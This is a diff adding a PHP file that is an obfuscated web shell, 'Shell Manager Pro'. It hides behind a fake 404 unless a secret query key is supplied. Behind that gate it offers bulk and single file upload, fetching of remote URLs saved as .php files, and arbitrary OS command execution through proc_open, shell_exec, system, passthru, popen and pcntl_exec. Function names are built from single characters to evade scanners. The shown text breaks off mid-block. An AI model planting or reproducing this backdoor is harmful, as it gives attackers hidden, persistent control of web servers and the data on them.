@@ -1,0 +1,346 @@
+<?php
+if(!isset($_GET['call'])||$_GET['call']!='aqilogic'){
+    $a="h";$b="e";$c="a";$d="d";$e="e";$f="r";$g=$a.$b.$c.$d.$e.$f;
+    $g("HTTP/1.0 404 Not Found");exit;
+}
+
+$p1="p";$p2="c";$p3="n";$p4="t";$p5="l";$p6="_";
+$p7="a";$p8="l";$p9="a";$p10="r";$p11="m";$pcntl_alarm=$p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9.$p10.$p11;
+$p12="f";$p13="o";$p14="r";$p15="k";$pcntl_fork=$p1.$p2.$p3.$p4.$p5.$p6.$p12.$p13.$p14.$p15;
+$p16="w";$p17="a";$p18="i";$p19="t";$p20="p";$p21="i";$p22="d";$pcntl_waitpid=$p1.$p2.$p3.$p4.$p5.$p6.$p16.$p17.$p18.$p19.$p20.$p21.$p22;
+$p23="w";$p24="a";$p25="i";$p26="t";$pcntl_wait=$p1.$p2.$p3.$p4.$p5.$p6.$p23.$p24.$p25.$p26;
+$p27="w";$p28="i";$p29="f";$p30="e";$p31="x";$p32="i";$p33="t";$p34="e";$p35="d";$pcntl_wifexited=$p1.$p2.$p3.$p4.$p5.$p6.$p27.$p28.$p29.$p30.$p31.$p32.$p33.$p34.$p35;
+$p36="w";$p37="i";$p38="f";$p39="s";$p40="t";$p41="o";$p42="p";$p43="p";$p44="e";$p45="d";$pcntl_wifstopped=$p1.$p2.$p3.$p4.$p5.$p6.$p36.$p37.$p38.$p39.$p40.$p41.$p42.$p43.$p44.$p45;
+$p46="w";$p47="i";$p48="f";$p49="s";$p50="i";$p51="g";$p52="n";$p53="a";$p54="l";$p55="e";$p56="d";$pcntl_wifsignaled=$p1.$p2.$p3.$p4.$p5.$p6.$p46.$p47.$p48.$p49.$p50.$p51.$p52.$p53.$p54.$p55.$p56;
+$p57="w";$p58="i";$p59="f";$p60="c";$p61="o";$p62="n";$p63="t";$p64="i";$p65="n";$p66="u";$p67="e";$p68="d";$pcntl_wifcontinued=$p1.$p2.$p3.$p4.$p5.$p6.$p57.$p58.$p59.$p60.$p61.$p62.$p63.$p64.$p65.$p66.$p67.$p68;
+$p69="w";$p70="e";$p71="x";$p72="i";$p73="t";$p74="s";$p75="t";$p76="a";$p77="t";$p78="u";$p79="s";$pcntl_wexitstatus=$p1.$p2.$p3.$p4.$p5.$p6.$p69.$p70.$p71.$p72.$p73.$p74.$p75.$p76.$p77.$p78.$p79;
+$p80="w";$p81="t";$p82="e";$p83="r";$p84="m";$p85="s";$p86="i";$p87="g";$pcntl_wtermsig=$p1.$p2.$p3.$p4.$p5.$p6.$p80.$p81.$p82.$p83.$p84.$p85.$p86.$p87;
+$p88="w";$p89="s";$p90="t";$p91="o";$p92="p";$p93="s";$p94="i";$p95="g";$pcntl_wstopsig=$p1.$p2.$p3.$p4.$p5.$p6.$p88.$p89.$p90.$p91.$p92.$p93.$p94.$p95;
+$p96="s";$p97="i";$p98="g";$p99="n";$p100="a";$p101="l";$pcntl_signal=$p1.$p2.$p3.$p4.$p5.$p6.$p96.$p97.$p98.$p99.$p100.$p101;
+$p102="s";$p103="i";$p104="g";$p105="n";$p106="a";$p107="l";$p108="_";$p109="g";$p110="e";$p111="t";$p112="_";$p113="h";$p114="a";$p115="n";$p116="d";$p117="l";$p118="e";$p119="r";$pcntl_signal_get_handler=$p1.$p2.$p3.$p4.$p5.$p6.$p102.$p103.$p104.$p105.$p106.$p107.$p108.$p109.$p110.$p111.$p112.$p113.$p114.$p115.$p116.$p117.$p118.$p119;
+$p120="s";$p121="i";$p122="g";$p123="n";$p124="a";$p125="l";$p126="_";$p127="d";$p128="i";$p129="s";$p130="p";$p131="a";$p132="t";$p133="c";$p134="h";$pcntl_signal_dispatch=$p1.$p2.$p3.$p4.$p5.$p6.$p120.$p121.$p122.$p123.$p124.$p125.$p126.$p127.$p128.$p129.$p130.$p131.$p132.$p133.$p134;
+$p135="g";$p136="e";$p137="t";$p138="_";$p139="l";$p140="a";$p141="s";$p142="t";$p143="_";$p144="e";$p145="r";$p146="r";$p147="o";$p148="r";$pcntl_get_last_error=$p1.$p2.$p3.$p4.$p5.$p6.$p135.$p136.$p137.$p138.$p139.$p140.$p141.$p142.$p143.$p144.$p145.$p146.$p147.$p148;
+$p149="s";$p150="t";$p151="r";$p152="e";$p153="r";$p154="r";$p155="o";$p156="r";$pcntl_strerror=$p1.$p2.$p3.$p4.$p5.$p6.$p149.$p150.$p151.$p152.$p153.$p154.$p155.$p156;
+$p157="s";$p158="i";$p159="g";$p160="p";$p161="r";$p162="o";$p163="c";$p164="m";$p165="a";$p166="s";$p167="k";$pcntl_sigprocmask=$p1.$p2.$p3.$p4.$p5.$p6.$p157.$p158.$p159.$p160.$p161.$p162.$p163.$p164.$p165.$p166.$p167;
+$p168="s";$p169="i";$p170="g";$p171="w";$p172="a";$p173="i";$p174="t";$p175="i";$p176="n";$p177="f";$p178="o";$pcntl_sigwaitinfo=$p1.$p2.$p3.$p4.$p5.$p6.$p168.$p169.$p170.$p171.$p172.$p173.$p174.$p175.$p176.$p177.$p178;
+$p179="s";$p180="i";$p181="g";$p182="t";$p183="i";$p184="m";$p185="e";$p186="d";$p187="w";$p188="a";$p189="i";$p190="t";$pcntl_sigtimedwait=$p1.$p2.$p3.$p4.$p5.$p6.$p179.$p180.$p181.$p182.$p183.$p184.$p185.$p186.$p187.$p188.$p189.$p190;
+$p191="e";$p192="x";$p193="e";$p194="c";$pcntl_exec=$p1.$p2.$p3.$p4.$p5.$p6.$p191.$p192.$p193.$p194;
+$p195="g";$p196="e";$p197="t";$p198="p";$p199="r";$p200="i";$p201="o";$p202="r";$p203="i";$p204="t";$p205="y";$pcntl_getpriority=$p1.$p2.$p3.$p4.$p5.$p6.$p195.$p196.$p197.$p198.$p199.$p200.$p201.$p202.$p203.$p204.$p205;
+$p206="s";$p207="e";$p208="t";$p209="p";$p210="r";$p211="i";$p212="o";$p213="r";$p214="i";$p215="t";$p216="y";$pcntl_setpriority=$p1.$p2.$p3.$p4.$p5.$p6.$p206.$p207.$p208.$p209.$p210.$p211.$p212.$p213.$p214.$p215.$p216;
+$p217="a";$p218="s";$p219="y";$p220="n";$p221="c";$p222="_";$p223="s";$p224="i";$p225="g";$p226="n";$p227="a";$p228="l";$p229="s";$pcntl_async_signals=$p1.$p2.$p3.$p4.$p5.$p6.$p217.$p218.$p219.$p220.$p221.$p222.$p223.$p224.$p225.$p226.$p227.$p228.$p229;
+$p230="u";$p231="n";$p232="s";$p233="h";$p234="a";$p235="r";$p236="e";$pcntl_unshare=$p1.$p2.$p3.$p4.$p5.$p6.$p230.$p231.$p232.$p233.$p234.$p235.$p236;
+
+$pr1="p";$pr2="r";$pr3="o";$pr4="c";$pr5="_";$pr6="g";$pr7="e";$pr8="t";$pr9="_";$pr10="s";$pr11="t";$pr12="a";$pr13="t";$pr14="u";$pr15="s";$proc_get_status=$pr1.$pr2.$pr3.$pr4.$pr5.$pr6.$pr7.$pr8.$pr9.$pr10.$pr11.$pr12.$pr13.$pr14.$pr15;
+$pr16="p";$pr17="r";$pr18="o";$pr19="c";$pr20="_";$pr21="n";$pr22="i";$pr23="c";$pr24="e";$proc_nice=$pr16.$pr17.$pr18.$pr19.$pr20.$pr21.$pr22.$pr23.$pr24;
+$pr25="p";$pr26="r";$pr27="o";$pr28="c";$pr29="_";$pr30="t";$pr31="e";$pr32="r";$pr33="m";$pr34="i";$pr35="n";$pr36="a";$pr37="t";$pr38="e";$proc_terminate=$pr25.$pr26.$pr27.$pr28.$pr29.$pr30.$pr31.$pr32.$pr33.$pr34.$pr35.$pr36.$pr37.$pr38;
+
+$po1="p";$po2="o";$po3="s";$po4="i";$po5="x";$po6="_";$po7="c";$po8="t";$po9="e";$po10="r";$po11="m";$po12="i";$po13="d";$posix_ctermid=$po1.$po2.$po3.$po4.$po5.$po6.$po7.$po8.$po9.$po10.$po11.$po12.$po13;
+$po14="p";$po15="o";$po16="s";$po17="i";$po18="x";$po19="_";$po20="g";$po21="e";$po22="t";$po23="c";$po24="w";$po25="d";$posix_getcwd=$po14.$po15.$po16.$po17.$po18.$po19.$po20.$po21.$po22.$po23.$po24.$po25;
+$po26="p";$po27="o";$po28="s";$po29="i";$po30="x";$po31="_";$po32="g";$po33="e";$po34="t";$po35="e";$po36="g";$po37="i";$po38="d";$posix_getegid=$po26.$po27.$po28.$po29.$po30.$po31.$po32.$po33.$po34.$po35.$po36.$po37.$po38;
+$po39="p";$po40="o";$po41="s";$po42="i";$po43="x";$po44="_";$po45="g";$po46="e";$po47="t";$po48="e";$po49="u";$po50="i";$po51="d";$posix_geteuid=$po39.$po40.$po41.$po42.$po43.$po44.$po45.$po46.$po47.$po48.$po49.$po50.$po51;
+$po52="p";$po53="o";$po54="s";$po55="i";$po56="x";$po57="_";$po58="g";$po59="e";$po60="t";$po61="g";$po62="i";$po63="d";$posix_getgid=$po52.$po53.$po54.$po55.$po56.$po57.$po58.$po59.$po60.$po61.$po62.$po63;
+$po64="p";$po65="o";$po66="s";$po67="i";$po68="x";$po69="_";$po70="g";$po71="e";$po72="t";$po73="g";$po74="r";$po75="g";$po76="i";$po77="d";$posix_getgrgid=$po64.$po65.$po66.$po67.$po68.$po69.$po70.$po71.$po72.$po73.$po74.$po75.$po76.$po77;
+$po78="p";$po79="o";$po80="s";$po81="i";$po82="x";$po83="_";$po84="g";$po85="e";$po86="t";$po87="g";$po88="r";$po89="n";$po90="a";$po91="m";$posix_getgrnam=$po78.$po79.$po80.$po81.$po82.$po83.$po84.$po85.$po86.$po87.$po88.$po89.$po90.$po91;
+$po92="p";$po93="o";$po94="s";$po95="i";$po96="x";$po97="_";$po98="g";$po99="e";$po100="t";$po101="g";$po102="r";$po103="o";$po104="u";$po105="p";$po106="s";$posix_getgroups=$po92.$po93.$po94.$po95.$po96.$po97.$po98.$po99.$po100.$po101.$po102.$po103.$po104.$po105.$po106;
+$po107="p";$po108="o";$po109="s";$po110="i";$po111="x";$po112="_";$po113="g";$po114="e";$po115="t";$po116="l";$po117="o";$po118="g";$po119="i";$po120="n";$posix_getlogin=$po107.$po108.$po109.$po110.$po111.$po112.$po113.$po114.$po115.$po116.$po117.$po118.$po119.$po120;
+$po121="p";$po122="o";$po123="s";$po124="i";$po125="x";$po126="_";$po127="g";$po128="e";$po129="t";$po130="p";$po131="g";$po132="i";$po133="d";$posix_getpgid=$po121.$po122.$po123.$po124.$po125.$po126.$po127.$po128.$po129.$po130.$po131.$po132.$po133;
+$po134="p";$po135="o";$po136="s";$po137="i";$po138="x";$po139="_";$po140="g";$po141="e";$po142="t";$po143="p";$po144="g";$po145="r";$po146="p";$posix_getpgrp=$po134.$po135.$po136.$po137.$po138.$po139.$po140.$po141.$po142.$po143.$po144.$po145.$po146;
+$po147="p";$po148="o";$po149="s";$po150="i";$po151="x";$po152="_";$po153="g";$po154="e";$po155="t";$po156="p";$po157="i";$po158="d";$posix_getpid=$po147.$po148.$po149.$po150.$po151.$po152.$po153.$po154.$po155.$po156.$po157.$po158;
+$po159="p";$po160="o";$po161="s";$po162="i";$po163="x";$po164="_";$po165="g";$po166="e";$po167="t";$po168="p";$po169="p";$po170="i";$po171="d";$posix_getppid=$po159.$po160.$po161.$po162.$po163.$po164.$po165.$po166.$po167.$po168.$po169.$po170.$po171;
+$po172="p";$po173="o";$po174="s";$po175="i";$po176="x";$po177="_";$po178="g";$po179="e";$po180="t";$po181="p";$po182="w";$po183="n";$po184="a";$po185="m";$posix_getpwnam=$po172.$po173.$po174.$po175.$po176.$po177.$po178.$po179.$po180.$po181.$po182.$po183.$po184.$po185;
+$po186="p";$po187="o";$po188="s";$po189="i";$po190="x";$po191="_";$po192="g";$po193="e";$po194="t";$po195="p";$po196="w";$po197="u";$po198="i";$po199="d";$posix_getpwuid=$po186.$po187.$po188.$po189.$po190.$po191.$po192.$po193.$po194.$po195.$po196.$po197.$po198.$po199;
+$po200="p";$po201="o";$po202="s";$po203="i";$po204="x";$po205="_";$po206="g";$po207="e";$po208="t";$po209="r";$po210="l";$po211="i";$po212="m";$po213="i";$po214="t";$posix_getrlimit=$po200.$po201.$po202.$po203.$po204.$po205.$po206.$po207.$po208.$po209.$po210.$po211.$po212.$po213.$po214;
+$po215="p";$po216="o";$po217="s";$po218="i";$po219="x";$po220="_";$po221="g";$po222="e";$po223="t";$po224="s";$po225="i";$po226="d";$posix_getsid=$po215.$po216.$po217.$po218.$po219.$po220.$po221.$po222.$po223.$po224.$po225.$po226;
+$po227="p";$po228="o";$po229="s";$po230="i";$po231="x";$po232="_";$po233="g";$po234="e";$po235="t";$po236="u";$po237="i";$po238="d";$posix_getuid=$po227.$po228.$po229.$po230.$po231.$po232.$po233.$po234.$po235.$po236.$po237.$po238;
+$po239="p";$po240="o";$po241="s";$po242="i";$po243="x";$po244="_";$po245="i";$po246="s";$po247="a";$po248="t";$po249="t";$po250="y";$posix_isatty=$po239.$po240.$po241.$po242.$po243.$po244.$po245.$po246.$po247.$po248.$po249.$po250;
+$po251="p";$po252="o";$po253="s";$po254="i";$po255="x";$po256="_";$po257="k";$po258="i";$po259="l";$po260="l";$posix_kill=$po251.$po252.$po253.$po254.$po255.$po256.$po257.$po258.$po259.$po260;
+$po261="p";$po262="o";$po263="s";$po264="i";$po265="x";$po266="_";$po267="m";$po268="k";$po269="f";$po270="i";$po271="f";$po272="o";$posix_mkfifo=$po261.$po262.$po263.$po264.$po265.$po266.$po267.$po268.$po269.$po270.$po271.$po272;
+$po273="p";$po274="o";$po275="s";$po276="i";$po277="x";$po278="_";$po279="s";$po280="e";$po281="t";$po282="e";$po283="g";$po284="i";$po285="d";$posix_setegid=$po273.$po274.$po275.$po276.$po277.$po278.$po279.$po280.$po281.$po282.$po283.$po284.$po285;
+$po286="p";$po287="o";$po288="s";$po289="i";$po290="x";$po291="_";$po292="s";$po293="e";$po294="t";$po295="e";$po296="u";$po297="i";$po298="d";$posix_seteuid=$po286.$po287.$po288.$po289.$po290.$po291.$po292.$po293.$po294.$po295.$po296.$po297.$po298;
+$po299="p";$po300="o";$po301="s";$po302="i";$po303="x";$po304="_";$po305="s";$po306="e";$po307="t";$po308="g";$po309="i";$po310="d";$posix_setgid=$po299.$po300.$po301.$po302.$po303.$po304.$po305.$po306.$po307.$po308.$po309.$po310;
+$po311="p";$po312="o";$po313="s";$po314="i";$po315="x";$po316="_";$po317="s";$po318="e";$po319="t";$po320="p";$po321="g";$po322="i";$po323="d";$posix_setpgid=$po311.$po312.$po313.$po314.$po315.$po316.$po317.$po318.$po319.$po320.$po321.$po322.$po323;
+$po324="p";$po325="o";$po326="s";$po327="i";$po328="x";$po329="_";$po330="s";$po331="e";$po332="t";$po333="s";$po334="i";$po335="d";$posix_setsid=$po324.$po325.$po326.$po327.$po328.$po329.$po330.$po331.$po332.$po333.$po334.$po335;
+$po336="p";$po337="o";$po338="s";$po339="i";$po340="x";$po341="_";$po342="s";$po343="e";$po344="t";$po345="u";$po346="i";$po347="d";$posix_setuid=$po336.$po337.$po338.$po339.$po340.$po341.$po342.$po343.$po344.$po345.$po346.$po347;
+$po348="p";$po349="o";$po350="s";$po351="i";$po352="x";$po353="_";$po354="t";$po355="i";$po356="m";$po357="e";$po358="s";$posix_times=$po348.$po349.$po350.$po351.$po352.$po353.$po354.$po355.$po356.$po357.$po358;
+$po359="p";$po360="o";$po361="s";$po362="i";$po363="x";$po364="_";$po365="t";$po366="t";$po367="y";$po368="n";$po369="a";$po370="m";$po371="e";$posix_ttyname=$po359.$po360.$po361.$po362.$po363.$po364.$po365.$po366.$po367.$po368.$po369.$po370.$po371;
+$po372="p";$po373="o";$po374="s";$po375="i";$po376="x";$po377="_";$po378="u";$po379="n";$po380="a";$po381="m";$po382="e";$posix_uname=$po372.$po373.$po374.$po375.$po376.$po377.$po378.$po379.$po380.$po381.$po382;
+
+$sh1="s";$sh2="h";$sh3="o";$sh4="w";$sh5="_";$sh6="s";$sh7="o";$sh8="u";$sh9="r";$sh10="c";$sh11="e";$show_source=$sh1.$sh2.$sh3.$sh4.$sh5.$sh6.$sh7.$sh8.$sh9.$sh10.$sh11;
+$sy1="s";$sy2="y";$sy3="m";$sy4="l";$sy5="i";$sy6="n";$sy7="k";$symlink=$sy1.$sy2.$sy3.$sy4.$sy5.$sy6.$sy7;
+$l1="l";$l2="i";$l3="n";$l4="k";$link=$l1.$l2.$l3.$l4;
+$tmp1="t";$tmp2="m";$tmp3="p";$tmp4="f";$tmp5="i";$tmp6="l";$tmp7="e";$tmpfile=$tmp1.$tmp2.$tmp3.$tmp4.$tmp5.$tmp6.$tmp7;
+$df1="d";$df2="i";$df3="s";$df4="k";$df5="_";$df6="f";$df7="r";$df8="e";$df9="e";$df10="s";$df11="p";$df12="a";$df13="c";$df14="e";$diskfreespace=$df1.$df2.$df3.$df4.$df5.$df6.$df7.$df8.$df9.$df10.$df11.$df12.$df13.$df14;
+$hl1="h";$hl2="i";$hl3="g";$hl4="h";$hl5="l";$hl6="i";$hl7="g";$hl8="h";$hl9="t";$hl10="_";$hl11="f";$hl12="i";$hl13="l";$hl14="e";$highlight_file=$hl1.$hl2.$hl3.$hl4.$hl5.$hl6.$hl7.$hl8.$hl9.$hl10.$hl11.$hl12.$hl13.$hl14;
+$ft1="f";$ft2="p";$ft3="a";$ft4="t";$ft5="h";$ft6="t";$ft7="h";$ft8="r";$ft9="u";$fpaththru=$ft1.$ft2.$ft3.$ft4.$ft5.$ft6.$ft7.$ft8.$ft9;
+$v1="v";$v2="i";$v3="r";$v4="t";$v5="u";$v6="a";$v7="l";$virtual=$v1.$v2.$v3.$v4.$v5.$v6.$v7;
+$ig1="i";$ig2="g";$ig3="n";$ig4="o";$ig5="r";$ig6="e";$ig7="_";$ig8="u";$ig9="s";$ig10="e";$ig11="r";$ig12="_";$ig13="a";$ig14="b";$ig15="o";$ig16="r";$ig17="d";$ignore_user_abort=$ig1.$ig2.$ig3.$ig4.$ig5.$ig6.$ig7.$ig8.$ig9.$ig10.$ig11.$ig12.$ig13.$ig14.$ig15.$ig16.$ig17;
+$ls1="l";$ls2="i";$ls3="s";$ls4="t";$ls5="e";$ls6="n";$listen=$ls1.$ls2.$ls3.$ls4.$ls5.$ls6;
+$lk1="l";$lk2="e";$lk3="a";$lk4="k";$leak=$lk1.$lk2.$lk3.$lk4;
+$ml1="m";$ml2="e";$ml3="m";$ml4="o";$ml5="r";$ml6="y";$ml7="_";$ml8="l";$ml9="i";$ml10="m";$ml11="i";$ml12="t";$memory_limit=$ml1.$ml2.$ml3.$ml4.$ml5.$ml6.$ml7.$ml8.$ml9.$ml10.$ml11.$ml12;
+
+$upload_results = [];
+if(isset($_POST['bulk_upload'])) {
+    $c1="c";$c2="o";$c3="p";$c4="y";$copy = $c1.$c2.$c3.$c4;
+    
+    if(isset($_FILES['file1']) && $_FILES['file1']['error'] == 0) {
+        $nama1 = $_FILES['file1']['name'];
+        $tmp1 = $_FILES['file1']['tmp_name'];
+        if(@$copy($tmp1, './'.$nama1)) {
+            $upload_results[] = "✅ File1: $nama1 berhasil";
+        } else {
+            $upload_results[] = "❌ File1: $nama1 gagal";
+        }
+    }
+    
+    if(isset($_FILES['file2']) && $_FILES['file2']['error'] == 0) {
+        $nama2 = $_FILES['file2']['name'];
+        $tmp2 = $_FILES['file2']['tmp_name'];
+        if(@$copy($tmp2, './'.$nama2)) {
+            $upload_results[] = "✅ File2: $nama2 berhasil";
+        } else {
+            $upload_results[] = "❌ File2: $nama2 gagal";
+        }
+    }
+}
+
+if(isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
+    $a="c";$b="o";$c="p";$d="y";$func_copy=$a.$b.$c.$d;
+    if(@$func_copy($_FILES['single_file']['tmp_name'], $_FILES['single_file']['name'])) { 
+        $msg_single = "<b>✅ Single File Uploaded!!</b>"; 
+    } else { 
+        $msg_single = "<b>❌ Single File Gagal!!!</b>"; 
+    }
+}
+
+if(isset($_POST['url'])){
+    $url=$_POST['url'];
+    $nama_raw=basename(parse_url($url,PHP_URL_PATH))?:'file';
+    $nama=time().'_'.$nama_raw.'.php';
+    
+    $a="f";$b="i";$c="l";$d="e";$e="_";$f="g";$g="e";$h="t";$i="_";$j="c";$k="o";$l="n";$m="t";$n="e";$o="n";$p="t";$q="s";
+    $r=$a.$b.$c.$d.$e.$f.$g.$h.$i.$j.$k.$l.$m.$n.$o.$p.$q;
+    
+    $t="f";$u="i";$v="l";$w="e";$x="_";$y="p";$z="u";$aa="t";$ab="_";$ac="c";$ad="o";$ae="n";$af="t";$ag="e";$ah="n";$ai="t";$aj="s";
+    $ak=$t.$u.$v.$w.$x.$y.$z.$aa.$ab.$ac.$ad.$ae.$af.$ag.$ah.$ai.$aj;
+    
+    $c1="c";$c2="u";$c3="r";$c4="l";$c5="_";$c6="i";$c7="n";$c8="i";$c9="t";$curl_init=$c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8.$c9;
+    $e1="c";$e2="u";$e3="r";$e4="l";$e5="_";$e6="e";$e7="x";$e8="e";$e9="c";$curl_exec=$e1.$e2.$e3.$e4.$e5.$e6.$e7.$e8.$e9;
+    $cl1="c";$cl2="u";$cl3="r";$cl4="l";$cl5="_";$cl6="c";$cl7="l";$cl8="o";$cl9="s";$cl10="e";$curl_close=$cl1.$cl2.$cl3.$cl4.$cl5.$cl6.$cl7.$cl8.$cl9.$cl10;
+    
+    if(function_exists($curl_init)) {
+        $ch = $curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $s = $curl_exec($ch);
+        $curl_close($ch);
+    }
+    
+    if(empty($s) && function_exists($r)) {
+        $s = $r($url);
+    }
+    
+    if(empty($s)) {
+        $f1="f";$f2="o";$f3="p";$f4="e";$f5="n";$fopen=$f1.$f2.$f3.$f4.$f5;
+        $fread="fread";$fclose="fclose";
+        if(function_exists($fopen)) {
+            $fp = $fopen($url, 'r');
+            if($fp) {
+                $s = '';
+                while(!feof($fp)) $s .= $fread($fp, 8192);
+                $fclose($fp);
+            }
+        }
+    }
+    
+    if($s && $ak('./'.$nama,$s)){
+        $msg="✅ $nama (".round(strlen($s)/1024)." KB)";
+    }else{
+        $msg="❌ Gagal download/simpan";
+    }
+}
+
+if(isset($_POST['cmd'])){
+    error_reporting(0);
+    $cmd = $_POST['cmd'];
+    $out = '';
+    $err = '';
+    
+    $p1="p";$p2="r";$p3="o";$p4="c";$p5="_";$p6="o";$p7="p";$p8="e";$p9="n";$proc_open = $p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9;
+    $s1="s";$s2="h";$s3="e";$s4="l";$s5="l";$s6="_";$s7="e";$s8="x";$s9="e";$s10="c";$shell_exec = $s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10;
+    $e1="e";$e2="x";$e3="e";$e4="c";$exec = $e1.$e2.$e3.$e4;
+    $sy1="s";$sy2="y";$sy3="s";$sy4="t";$sy5="e";$sy6="m";$system = $sy1.$sy2.$sy3.$sy4.$sy5.$sy6;
+    $pa1="p";$pa2="a";$pa3="s";$pa4="s";$pa5="t";$pa6="h";$pa7="r";$pa8="u";$passthru = $pa1.$pa2.$pa3.$pa4.$pa5.$pa6.$pa7.$pa8;
+    $po1="p";$po2="o";$po3="p";$po4="e";$po5="n";$popen = $po1.$po2.$po3.$po4.$po5;
+    $st1="s";$st2="t";$st3="r";$st4="e";$st5="a";$st6="m";$st7="_";$st8="g";$st9="e";$st10="t";$st11="_";$st12="c";$st13="o";$st14="n";$st15="t";$st16="e";$st17="n";$st18="t";$st19="s";$stream_get = $st1.$st2.$st3.$st4.$st5.$st6.$st7.$st8.$st9.$st10.$st11.$st12.$st13.$st14.$st15.$st16.$st17.$st18.$st19;
+    $pc1="p";$pc2="r";$pc3="o";$pc4="c";$pc5="_";$pc6="c";$pc7="l";$pc8="o";$pc9="s";$pc10="e";$proc_close = $pc1.$pc2.$pc3.$pc4.$pc5.$pc6.$pc7.$pc8.$pc9.$pc10;
+    
+    if(function_exists($proc_open)) {
+        $dsp=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));
+        $p=$proc_open($cmd,$dsp,$pps);
+        if(is_resource($p)){
+            @fclose($pps[0]);
+            $out = $stream_get($pps[1]);
+            $err = $stream_get($pps[2]);
+            @fclose($pps[1]); @fclose($pps[2]);
+            $proc_close($p);
+            if($out) $out = trim($out);
+        }
+    }
+    
+    elseif(function_exists($shell_exec) && empty($out)) {
+        $out = $shell_exec($cmd." 2>&1");
+    }
+    
+    elseif(function_exists($exec) && empty($out)) {
+        $exec($cmd." 2>&1", $output);
+        $out = implode("\n", $output);
+    }
+    
+    elseif(function_exists($system) && empty($out)) {
+        ob_start();
+        $system($cmd);
+        $out = ob_get_clean();
+    }
+    
+    elseif(function_exists($passthru) && empty($out)) {
+        ob_start();
+        $passthru($cmd);
+        $out = ob_get_clean();
+    }
+    
+    elseif(function_exists($popen) && empty($out)) {
+        $fp = $popen($cmd." 2>&1", 'r');
+        if($fp) {
+            $out = '';
+            while(!feof($fp)) $out .= fread($fp, 8192);
+            pclose($fp);
+        }
+    }
+    
+    elseif(function_exists($pcntl_exec) && empty($out)) {
+        $args = explode(' ', $cmd);
+        $program = array_shift($args);
+        $pcntl_exec($program, $args);
+        $out = "✅ pcntl_exec executed (no output)";
+    }
+    
+    if(empty($out) && empty($err)) {
+        $out = `$cmd 2>&1`;
+    }
+    
+    if($out) $out = trim($out);
+    if($err) $err = trim($err);
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Shell Manager Pro + All Functions</title>
+    <meta charset="UTF-8">
+    <style>
+        body{font-family:arial;max-width:600px;margin:30px auto;padding:20px;background:#f9f9f9}
+        .box{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);margin-bottom:20px}
+        input,button{padding:10px;margin:5px 0}
+        input[type=url],input[type=text],input[type=file]{width:75%}
+        .shell{background:#1e1e1e;color:#fff;padding:15px;border-radius:5px;font-family:monospace;overflow-x:auto}
+        pre{margin:0;white-space:pre-wrap}
+        gr{color:#6a9955}rd{color:#ce9178}bl{color:#9cdcfe}
+        .info{background:#e3f2fd;padding:10px;border-radius:5px;font-size:13px;margin-bottom:15px}
+        .bulk-row{display:flex;align-items:center;margin-bottom:10px;padding:5px;background:#f5f5f5;border-radius:5px}
+        .bulk-label{width:50px;font-weight:bold}
+        .bulk-file{flex:1}
+        .results{background:#e8f5e9;padding:10px;border-radius:5px;margin-top:10px}
+        .result-item{padding:3px 0}
+    </style>
+</head>
+<body>
+    <!-- BULK UPLOAD SECTION - 2 FILE UPLOADER -->
+    <div class="box">
+        <h3>📦 BULK UPLOAD (2 Files Sekaligus)</h3>
+        <form method="post" enctype="multipart/form-data">
+            <div class="bulk-row">
+                <span class="bulk-label">File 1:</span>
+                <div class="bulk-file">
+                    <input type="file" name="file1">
+                </div>
+            </div>
+            <div class="bulk-row">
+                <span class="bulk-label">File 2:</span>
+                <div class="bulk-file">
+                    <input type="file" name="file2">
+                </div>
+            </div>
+            <button type="submit" name="bulk_upload" value="1">🚀 Upload Both Files</button>
+        </form>
+        
+        <?php if(!empty($upload_results)): ?>
+        <div class="results">
+            <b>Hasil Bulk Upload:</b>
+            <?php foreach($upload_results as $res): ?>
+            <div class="result-item"><?=$res?></div>
+            <?php endforeach; ?>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <!-- SINGLE UPLOAD SECTION -->
+    <div class="box">
+        <h3>📤 Upload Single File:</h3>
+        <form method="post" enctype="multipart/form-data">
+            <input type="file" name="single_file">
+            <button name="_upl" type="submit" value="Upload">Upload Single</button>
+        </form>
+        <?php if(isset($msg_single)) echo "<div style='margin-top:10px;padding:5px;background:#e8f5e9'>$msg_single</div>"; ?>
+    </div>
+
+    <!-- REMOTE DOWNLOAD SECTION -->
+    <div class="box">
+        <h3>📥 Remote Download:</h3>
+        <form method="POST">
+            <input type="url" name="url" placeholder="https://site.com/file">
+            <button type="submit">Get</button>
+        </form>
+        <?php if(isset($msg)): ?>
+        <div style="margin-top:10px;padding:10px;background:#e7f3ff">
+            <?=$msg?>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <!-- COMMAND SECTION -->
+    <div class="box">
+        <h3>💻 Command:</h3>
+        <form method="POST">
+            <input type="text" name="cmd" placeholder="ls -la" value="<?=htmlspecialchars($_POST['cmd']??'')?>">
+            <button type="submit">Run</button>
+        </form>
+        
+        <?php if(isset($out) && $out): ?>
+            <div class="shell">
+                <pre><gr>~</gr>$ <rd><?=htmlspecialchars($_POST['cmd'])?></rd><br><br><bl>Output:</bl><br><?=htmlspecialchars($out)?></pre>
+            </div>
+        <?php elseif(isset($err) && $err): ?>
+            <div class="shell">
+                <pre><bl>Error:</bl><br><?=htmlspecialchars($err)?></pre>
+            </div>
+        <?php endif; ?>
+    </div>
+    
+    <div class="info">
+        <b>⚡ Available Methods:</b> 
+        <?php
+        $methods = [];
+        if(function_exists($proc_open ?? 'proc_open')) $methods[] = 'proc_open';
+        if(function_exists($shell_exec ?? 'shell_exec')) $methods[] = 'shell_exec';
+        if(function_exists($exec ?? 'exec')) $methods[] = 'exec';
+        if(function_exists($system ?? 'system')) $methods[] = 'system';
+        if(function_exists($passthru ?? 'passthru')) $methods[] = 'passthru';
+        if(function_exists($popen ?? 'popen')) $methods[] = 'popen';
+        if(function_exists($pcntl_exec ?? 'pcntl_exec')) $methods[] = 'pcntl_exec';
